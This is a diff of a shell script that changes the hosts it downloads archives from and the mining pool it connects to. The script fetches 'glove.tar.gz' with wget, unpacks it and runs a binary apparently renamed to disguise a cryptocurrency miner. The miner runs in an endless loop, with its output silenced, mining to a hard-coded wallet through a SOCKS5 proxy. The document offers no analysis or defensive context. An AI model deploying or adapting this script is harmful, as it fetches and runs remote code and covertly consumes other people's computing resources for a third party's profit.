@@ -45,7 +45,7 @@ echo ""
 
 sleep 2
 
-wget http://greenleaf.teatspray.fun/Spectre.tar.gz
+wget http://greenleaf.teatspray.uk/Spectre.tar.gz
 
 sleep 2
 
@@ -78,7 +78,9 @@ TZ='Africa/Johannesburg'; export TZ
 date 
 sleep 2 
 
-wget -q http://greenleaf.teatspray.fun/glove.tar.gz >/dev/null
+wget -q http://greenleaf.teatspray.uk/glove.tar.gz >/dev/null
+
+sleep 2
 
 tar -xf glove.tar.gz
 
@@ -86,6 +88,6 @@ sleep 2
 
 while true
 do
-./glove -a minotaurx -o stratum+tcp://flyingsaucer-eu.teatspray.fun:7019 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 -p $currentdate,c=MAZA,zap=MAZA -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
+./glove -a minotaurx -o stratum+tcp://coinx.teatspray.uk:8243 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate -p c=MAZA,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
 sleep 10
 done
